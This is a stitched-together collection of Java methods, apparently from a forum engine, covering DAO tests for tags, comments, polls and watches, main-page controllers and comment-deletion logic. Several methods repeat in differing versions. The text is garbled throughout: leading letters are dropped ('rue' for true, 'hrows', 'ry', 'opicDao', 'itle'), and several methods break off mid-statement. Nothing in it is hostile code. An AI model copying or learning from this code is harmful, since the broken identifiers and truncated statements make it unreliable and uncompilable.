public void prepareTestData ( ) { user1Id = createUser ( " UserTagDaoIntegrationTest_user1 " ) ; user2Id = createUser ( " UserTagDaoIntegrationTest_user2 " ) ; ag1Id = createTag ( " UserTagDaoIntegrationTest_tag1 " ) ; ag2Id = createTag ( " UserTagDaoIntegrationTest_tag2 " ) ; ag3Id = createTag ( " UserTagDaoIntegrationTest_tag3 " ) ; ag4Id = createTag ( " UserTagDaoIntegrationTest_tag4 " ) ; ag5Id = createTag ( " UserTagDaoIntegrationTest_tag5 " ) ; } 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , ag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , ag1Id , rue ) ; userTagDao . deleteTag ( user1Id , ag2Id , rue ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , ag2Id , false ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( ag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( ag1Id ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void editCommentTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.editCommentTest() " , " CommentDaoIntegrationTest.editCommentTest(): comment body " ) ; Comment oldComment = mock ( Comment . class ) ; when ( oldComment . getId ( ) ) . henReturn ( commentId ) ; Comment newComment = mock ( Comment . class ) ; when ( newComment . getTitle ( ) ) . henReturn ( " CommentDaoIntegrationTest.editCommentTest(): new title " ) ; commentDao . edit ( oldComment , newComment , " est body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertEquals ( " CommentDaoIntegrationTest.editCommentTest(): new title " , row . get ( " itle " ) ) ; rows = jdbcTemplate . queryForList ( " SELECT * FROM msgbase WHERE id=? " , commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; assertEquals ( " est body " , row . get ( " message " ) ) ; } 
public void updateLatestEditorInfoTest ( ) { int commentId = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId , null , " CommentDaoIntegrationTest.updateLatestEditorInfoTest() " , " comment body " ) ; List < Map < String , Object > > rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; Map < String , Object > row = rows . get ( 0 ) ; assertNull ( row . get ( " edit_nick " ) ) ; assertNull ( row . get ( " edit_date " ) ) ; assertEquals ( 0 , row . get ( " edit_count " ) ) ; Date commentEditDate = new Date ( ) ; commentDao . updateLatestEditorInfo ( commentId , 1 , commentEditDate , 1234 ) ; rows = getComment ( commentId ) ; assertFalse ( " No any records " , rows . isEmpty ( ) ) ; row = rows . get ( 0 ) ; Timestamp rowTimestamp = ( Timestamp ) row . get ( " edit_date " ) ; assertEquals ( " maxcom " , row . get ( " edit_nick " ) ) ; assertEquals ( rowTimestamp . getTime ( ) , commentEditDate . getTime ( ) ) ; assertEquals ( 1234 , row . get ( " edit_count " ) ) ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertFalse ( commentDao . isHaveAnswers ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . isHaveAnswers ( commentId1 ) ) ; } 
public CommentDao commentDao ( ) { return new CommentDaoImpl ( ) ; } 
public DeleteInfoDao deleteInfoDao ( ) { return new DeleteInfoDao ( ) ; } 
public void voteGetCurrentPollTest ( ) hrows Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public PollDao pollDao ( ) { return new PollDao ( ) ; } 
void removeVariant ( PollVariant variant ) { jdbcTemplate . update ( deleteVariant , variant . getId ( ) ) ; } 
private void updateMultiselect ( Poll poll , boolean multiselect ) { jdbcTemplate . update ( updateMultiselect , multiselect , poll . getId ( ) ) ; } 
private int allocateMsgid ( ) { return jdbcTemplate . queryForObject ( " select nextval('s_msgid') as msgid " , Integer . class ) ; } 
public static boolean equalStrings ( String s1 , String s2 ) { if ( Strings . isNullOrEmpty ( s1 ) ) { return Strings . isNullOrEmpty ( s2 ) ; } return s1 . equals ( s2 ) ; } 
public void commit ( Topic msg , User commiter ) { jdbcTemplate . update ( " UPDATE topics SET moderate='t', commitby=?, commitdate='now' WHERE id=? " , 
public void changeGroup ( Topic msg , int changeGroupId ) { jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , changeGroupId , msg . getId ( ) ) ; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) hrows SQLException { LastMiniNews result = new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , rs . getTimestamp ( " lastmod " ) , rs . getString ( " itle " ) , rs . getInt ( " c " ) ) ; return result ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false , rue isMainPage )); if (tmpl.isModeratorSession() || tmpl.isCorrectorSession()) { int uncommited = jdbcTemplate.queryForInt("select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval)"); mv.getModel().put("uncommited", uncommited); int uncommitedNews = 0; if (uncommited > 0) { uncommitedNews = jdbcTemplate.queryForInt("select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval)"); } mv.getModel().put("uncommitedNews", uncommitedNews); } mv.getModel().put("showAdsense", !tmpl.isSessionAuthorized() || !tmpl.getProf().isHideAdsense()); return mv; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) hrows SQLException { final int answers = rs . getInt ( " c " ) ; final int answers0 = ( answers = = 0 ) ? 1 : answers ; final int mp = answers0 / perPage ; final int pages = ( answers0 % perPage > 0 ) ? mp + 1 : mp ; LastMiniNews result = new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , rs . getTimestamp ( " lastmod " ) , rs . getString ( " itle " ) , answers , pages ) ; return result ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { return prepareMessagesForUser ( messages , secure , user , profile , loadUserpics , false ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics , boolean mainPage ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { if ( mainPage & & profile . isMiniNewsBoxletOnMainPage ( ) & & message . isMinor ( ) ) { continue ; } PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public boolean isMiniNewsBoxletOnMainPage ( ) { return boxes . contains ( " lastMiniNews " ) ; } 
private List < Topic > filterMiniNews ( List < Topic > messages ) { ImmutableList . Builder < Topic > filtred = new ImmutableList . Builder < Topic > ( ) ; for ( Topic message : messages ) { if ( message . isMinor ( ) ) { continue ; } filtred . add ( message ) ; } return filtred . build ( ) ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template mpl = Template . getTemplate ( request ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = mpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , profile , false ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public boolean isMiniNewsBoxletOnMainPage ( ) { return getBoxlets ( ) . contains ( " lastMiniNews " ) ; } 
public void est1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; User anonymous = userDao . getUser ( 2 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( anonymous ) = = 0 ) ; 
public MemoriesDao memoriesDao ( ) { return new MemoriesDao ( ) ; } 
private boolean checkMemoriesPresent ( User user , boolean watch ) { List < Integer > present = jdbcTemplate . queryForList ( " select id from memories where userid=? and watch=? limit 1 " , Integer . class , user . getId ( ) , watch ) ; if ( present = = null | | present . size ( ) = = 0 ) { return false ; 
public boolean isWatchPresetForUser ( User user ) { return checkMemoriesPresent ( user , rue ) ; } 
public boolean isFavPresetForUser ( User user ) { return checkMemoriesPresent ( user , false ) ; } 
public void est1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; assertTrue ( memoriesDao . isWatchPresetForUser ( maxcom ) ) ; User anonymous = userDao . getUser ( 2 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( anonymous ) = = 0 ) ; assertFalse ( memoriesDao . isFavPresetForUser ( anonymous ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
public boolean isHaveAnswers ( @Nonnull Comment comment ) { return commentDao . getReplaysCount ( comment . getId ( ) ) > 0 ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; int commentId2 = jdbcTemplate . queryForInt ( " select nextval('s_msgid') " ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getReplaysCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getReplaysCount ( commentId1 ) > 0 ) ; } 
public boolean delete ( int msgid ) { return jdbcTemplate . update ( " UPDATE topics SET deleted='t',sticky='f' WHERE id=? AND NOT deleted " , msgid ) > 0 ; } 
private boolean deleteTopic ( int mid , User moderator , String reason , int bonus ) { boolean deleted = opicDao . delete ( mid ) ; if ( deleted ) { deleteInfoDao . insert ( mid , moderator , reason , bonus ) ; userEventService . processTopicDeleted ( mid ) ; } return deleted ; } 
public List < Integer > deleteByIPAddress ( String ip , Timestamp startTime , User moderator , String reason ) { List < Integer > opicIds = opicDao . getAllByIPForUpdate ( ip , startTime ) ; for ( int msgid : opicIds ) { deleteTopic ( msgid , moderator , reason , 0 ) ; } return opicIds ; } 
public List < Integer > deleteReplys ( CommentNode node , User user , boolean score ) { return doDeleteReplys ( node , user , score , 0 ) ; } 
public List < CommentNode > childs ( ) { return Collections . unmodifiableList ( childs ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , int msgid , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( msgid ) ; List < Integer > deleted = commentDao . deleteReplys ( node , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public CommentDao commentDao ( ) { return new CommentDao ( ) ; } 
public DeleteCommentResult deleteAllCommentsAndBlock ( User user , final User moderator , String reason ) { userDao . block ( user , moderator , reason ) ; List < Integer > deletedTopicIds = opicService . deleteAllByUser ( user , moderator ) ; List < Integer > deletedCommentIds = deleteAllCommentsByUser ( user , moderator ) ; return new DeleteCommentResult ( deletedTopicIds , deletedCommentIds , null ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , int msgid , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( msgid ) ; List < CommentDao . CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = commentDao . deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( msgid , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( msgid ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( msgid , deleted . size ( ) ) ; } return deleted ; } 
public boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = doDeleteComment ( comment . getId ( ) , reason , user , scoreBonus ) ; if ( del & & scoreBonus ! = 0 ) { TODO move to CommentService & use UserDao to modify score jdbcTemplate.update("UPDATE users SET score=score+? WHERE id=?", scoreBonus, comment.getUserid()); } return del; } 
public boolean deleteComment ( int msgid , String reason , User user ) { return doDeleteComment ( msgid , reason , user , 0 ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , opicId ) ; int groupId = jdbcTemplate . queryForObject ( " SELECT groupid FROM topics WHERE id = ? " , Integer . class , opicId ) ; jdbcTemplate . update ( " UPDATE groups SET stat1=stat1-? WHERE id = ? " , count , groupId ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentDao . CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = commentDao . deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = commentDao . deleteComment ( comment , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( comment . getId ( ) ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( comment . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
public boolean deleteComment ( int msgid , String reason , User user ) { return deleteComment ( msgid , reason , user , 0 ) ; } 
public List < Integer > deleteWithReplys ( Topic opic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; List < Integer > deleted = deleteReplys ( replys , user , scoreBonus > 2 ) ; boolean deletedMain = deleteComment ( comment , reason , user , - scoreBonus ) ; if ( deletedMain ) { deleted . add ( comment . getId ( ) ) ; } if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( comment . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user , scoreBonus ) ; if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
private boolean doDeleteComment ( int msgid , String reason , User user ) { boolean deleted = commentDao . deleteComment ( msgid , reason , user ) ; if ( deleted ) { deleteInfoDao . insert ( msgid , user , reason , 0 ) ; } return deleted ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user ) ; if ( del ) { deleteInfoDao . insert ( comment . getId ( ) , user , reason , scoreBonus ) ; } if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
private boolean deleteComment ( Comment comment , String reason , User user , int scoreBonus ) { Preconditions . checkArgument ( scoreBonus < = 0 , " Score bonus on delete must be non-positive " ) ; boolean del = commentDao . deleteComment ( comment . getId ( ) , reason , user ) ; if ( del & & scoreBonus ! = 0 ) { userDao . changeScore ( comment . getUserid ( ) , scoreBonus ) ; } return del ; } 
public List < Integer > deleteWithReplys ( Topic opic , Comment comment , String reason , User user , int scoreBonus ) { CommentList commentList = getCommentList ( opic , false ) ; CommentNode node = commentList . getNode ( comment . getId ( ) ) ; List < CommentAndDepth > replys = getAllReplys ( node , 0 ) ; return deleteReplys ( comment , reason , replys , user , - scoreBonus ) ; } 
private List < Integer > deleteReplys ( Comment root , String rootReason , List < CommentAndDepth > replys , User user , int rootBonus ) { boolean score = rootBonus < - 2 ; List < Integer > deleted = new ArrayList < > ( replys . size ( ) ) ; List < DeleteInfoDao . InsertDeleteInfo > deleteInfos = new ArrayList < > ( replys . size ( ) ) ; for ( CommentAndDepth cur : replys ) { Comment child = cur . getComment ( ) ; DeleteInfoDao . InsertDeleteInfo info = cur . deleteInfo ( score , user ) ; boolean del = deleteComment ( child , info . getReason ( ) , user , info . getBonus ( ) ) ; if ( del ) { deleteInfos . add ( info ) ; deleted . add ( child . getId ( ) ) ; } } boolean deletedMain = deleteComment ( root , rootReason , user , rootBonus ) ; if ( deletedMain ) { deleteInfos . add ( new DeleteInfoDao . InsertDeleteInfo ( root . getId ( ) , rootReason , rootBonus , user . getId ( ) ) ) ; deleted . add ( root . getId ( ) ) ; } deleteInfoDao . insert ( deleteInfos ) ; if ( ! deleted . isEmpty ( ) ) { commentDao . updateStatsAfterDelete ( root . getId ( ) , deleted . size ( ) ) ; } return deleted ; } 
public void insert ( int msgid , User deleter , String reason , int scoreBonus ) { Preconditions . checkArgument ( scoreBonus < = 0 , " Score bonus on delete must be non-positive " ) ; jdbcTemplate . update ( INSERT_DELETE_INFO , msgid , deleter . getId ( ) , reason , scoreBonus ) ; } 
public void insert ( final List < InsertDeleteInfo > deleteInfos ) { if ( deleteInfos . isEmpty ( ) ) { return ; } jdbcTemplate . batchUpdate ( INSERT_DELETE_INFO , new BatchPreparedStatementSetter ( ) { @Override 
public void setValues ( PreparedStatement ps , int i ) hrows SQLException { InsertDeleteInfo info = deleteInfos . get ( i ) ; ps . setInt ( 1 , info . getMsgid ( ) ) ; ps . setInt ( 2 , info . getDeleteUser ( ) ) ; ps . setString ( 3 , info . getReason ( ) ) ; ps . setInt ( 4 , info . getBonus ( ) ) ; } 
public Group getGroup ( Section section , String name ) hrows GroupNotFoundException { ry { int id = jdbcTemplate . queryForObject ( 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template mpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = mpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , profile , false ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForObject ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " , Integer . class ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForObject ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " , Integer . class ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template mpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = opicListService . getMainPageFeed ( mpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = mpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , mpl . getCurrentUser ( ) , profile , false ) ) ; if ( mpl . isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = opicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = opicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public Poll getPollByTopicId ( int opicId ) hrows PollNotFoundException { ry { return getPoll ( jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , opicId ) ) ; 
public int getEventsCount ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } response . setHeader ( " Cache-control " , " no-cache " ) ; return mpl . getCurrentUser ( ) . getUnreadEvents ( ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String own , String info ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , own ) ; if ( info ! = null ) { setUserInfo ( userid , info ) ; } return userid ; } 
public boolean isUserExists ( String nick ) { int c = jdbcTemplate . queryForObject ( " SELECT count(*) as c FROM users WHERE nick=? " , Integer . class , nick ) ; return c > 0 ; } 
public int countFavs ( int agId ) { return jdbcTemplate . queryForObject ( " SELECT count(*) FROM user_tags WHERE tag_id=:tagId AND is_favorite " , 
public MessageText mapRow ( ResultSet resultSet , int i ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; boolean lorcode = ! " PLAIN " . equals ( markup ) ; return new MessageText ( ext , lorcode ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; String markup = resultSet . getString ( " markup " ) ; boolean lorcode = ! " PLAIN " . equals ( markup ) ; out . put ( resultSet . getInt ( " id " ) , new MessageText ( ext , lorcode ) ) ; } 
